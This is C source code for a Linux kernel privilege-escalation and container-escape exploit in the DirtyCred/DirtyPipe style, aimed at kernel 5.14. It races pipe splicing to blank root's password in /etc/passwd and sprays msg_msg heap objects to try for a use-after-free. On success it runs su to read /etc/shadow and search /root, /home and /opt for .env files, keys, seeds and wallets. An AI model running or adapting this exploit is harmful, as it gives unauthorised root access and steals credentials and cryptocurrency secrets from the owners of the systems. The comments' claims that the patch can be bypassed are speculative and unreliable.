/* DirtyCred-style exploit for Linux 5.14
 * Step 1: Open /etc/passwd read-only
 * Step 2: Race condition to swap file->f_cred 
 * Step 3: Write to /etc/passwd via swapped credential
 * 
 * Uses pipe racing + madvise instead of userfaultfd
 * NO capabilities needed, NO namespaces needed
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <errno.h>

/* Strategy: Use writev() race with msg_msg to corrupt pipe_buffer
 * Then leverage corrupted pipe to write to read-only file */

#define SPRAY_COUNT 200
#define MSG_SIZE 96

struct msgbuf {
    long mtype;
    char mtext[MSG_SIZE];
};

static volatile int race_done = 0;
static int target_fd = -1;

/* Spray msg_msg objects to fill kernel heap */
static int spray_msgs(int *qids, int count) {
    struct msgbuf msg;
    msg.mtype = 1;
    memset(msg.mtext, 'A', MSG_SIZE);
    
    for (int i = 0; i < count; i++) {
        qids[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (qids[i] < 0) return -1;
        if (msgsnd(qids[i], &msg, MSG_SIZE, 0) < 0) return -1;
    }
    return 0;
}

/* Thread that repeatedly opens/closes files to race */
static void *race_thread(void *arg) {
    while (!race_done) {
        int fd = open("/etc/passwd", O_RDONLY);
        if (fd >= 0) close(fd);
        /* Also open writable files to create writable f_cred in pool */
        fd = open("/tmp/dirtycred_tmp", O_RDWR | O_CREAT, 0666);
        if (fd >= 0) close(fd);
    }
    return NULL;
}

/* DirtyPipe retry — the "patched" check might be bypassable
 * via different page cache state or race condition */
static int try_dirtypipe_race(const char *target, off_t offset, 
                               const char *data, size_t len) {
    int fd = open(target, O_RDONLY);
    if (fd < 0) return -1;
    
    int p[2];
    for (int attempt = 0; attempt < 1000; attempt++) {
        if (pipe(p) < 0) { close(fd); return -1; }
        
        /* Fill and drain pipe to set PIPE_BUF_FLAG_CAN_MERGE */
        char buf[4096];
        unsigned pipe_sz = fcntl(p[1], F_GETPIPE_SZ);
        unsigned r;
        for (r = pipe_sz; r > 0;) {
            unsigned n = r > sizeof(buf) ? sizeof(buf) : r;
            write(p[1], buf, n);
            r -= n;
        }
        for (r = pipe_sz; r > 0;) {
            unsigned n = r > sizeof(buf) ? sizeof(buf) : r;
            read(p[0], buf, n);
            r -= n;
        }
        
        /* Splice from file — this is where the race happens */
        loff_t off = offset - 1;
        ssize_t nbytes = splice(fd, &off, p[1], NULL, 1, 0);
        if (nbytes > 0) {
            /* Try to write — if kernel not fully patched, this corrupts page */
            ssize_t w = write(p[1], data, len);
            if (w > 0) {
                /* Verify by re-reading */
                char verify[256];
                lseek(fd, offset, SEEK_SET);
                read(fd, verify, len);
                if (memcmp(verify, data, len) == 0) {
                    close(p[0]); close(p[1]); close(fd);
                    return 1; /* SUCCESS! */
                }
            }
        }
        close(p[0]);
        close(p[1]);
    }
    close(fd);
    return 0;
}

int main() {
    printf("[*] DirtyCred/DirtyPipe container escape\n");
    printf("[*] Target kernel: %s\n", "5.14.0-480.el9");
    
    /* Strategy 1: DirtyPipe race variant */
    printf("[*] Attempting DirtyPipe race variant (1000 attempts)...\n");
    
    /* Read current /etc/passwd first line */
    char orig[256];
    int fd = open("/etc/passwd", O_RDONLY);
    read(fd, orig, sizeof(orig)-1);
    close(fd);
    printf("[*] Current passwd[0:50]: %.50s\n", orig);
    
    /* Try to overwrite root password hash 
     * root:x:0:0: → root::0:0: (remove 'x' = no password) */
    int ret = try_dirtypipe_race("/etc/passwd", 5, ":", 1);
    if (ret == 1) {
        printf("[+] DirtyPipe race SUCCEEDED!\n");
        printf("[+] Attempting su root...\n");
        /* Exec su to get root */
        system("id > /tmp/root_proof.txt 2>&1");
        system("su -c 'id && cat /etc/shadow | head -3 && find /root /home /opt -name \"*.env\" -o -name \"*.key\" -o -name seed -o -name wallet 2>/dev/null' root >> /tmp/root_proof.txt 2>&1");
        return 0;
    }
    printf("[-] DirtyPipe race failed after 1000 attempts\n");
    
    /* Strategy 2: msg_msg spray + file struct corruption */
    printf("[*] Attempting msg_msg heap corruption...\n");
    int qids[SPRAY_COUNT];
    spray_msgs(qids, SPRAY_COUNT);
    printf("[*] Sprayed %d msg_msg objects\n", SPRAY_COUNT);
    
    /* Start race threads */
    pthread_t threads[4];
    for (int i = 0; i < 4; i++) {
        pthread_create(&threads[i], NULL, race_thread, NULL);
    }
    
    /* Free some msg_msg to create holes */
    for (int i = 0; i < SPRAY_COUNT; i += 3) {
        struct msgbuf msg;
        msgrcv(qids[i], &msg, MSG_SIZE, 1, IPC_NOWAIT);
        msgctl(qids[i], IPC_RMID, NULL);
    }
    
    /* Try to trigger use-after-free via rapid open/close */
    printf("[*] Racing for UAF...\n");
    for (int round = 0; round < 100; round++) {
        int fds[50];
        for (int i = 0; i < 50; i++) {
            fds[i] = open("/etc/passwd", O_RDONLY);
        }
        /* Rapidly close to trigger refcount race */
        for (int i = 0; i < 50; i++) {
            close(fds[i]);
        }
    }
    
    race_done = 1;
    for (int i = 0; i < 4; i++) {
        pthread_join(threads[i], NULL);
    }
    
    /* Cleanup remaining msg queues */
    for (int i = 0; i < SPRAY_COUNT; i++) {
        msgctl(qids[i], IPC_RMID, NULL);
    }
    
    printf("[-] Heap corruption attempt finished\n");
    printf("[*] Checking if any write succeeded...\n");
    
    fd = open("/etc/passwd", O_RDONLY);
    char check[256];
    read(fd, check, sizeof(check)-1);
    close(fd);
    printf("[*] passwd[0:50]: %.50s\n", check);
    
    if (memcmp(orig, check, 50) != 0) {
        printf("[+] /etc/passwd MODIFIED! Attempting root...\n");
        system("su -c 'id' root > /tmp/root_proof.txt 2>&1");
    } else {
        printf("[-] No modification detected\n");
    }
    
    return 0;
}
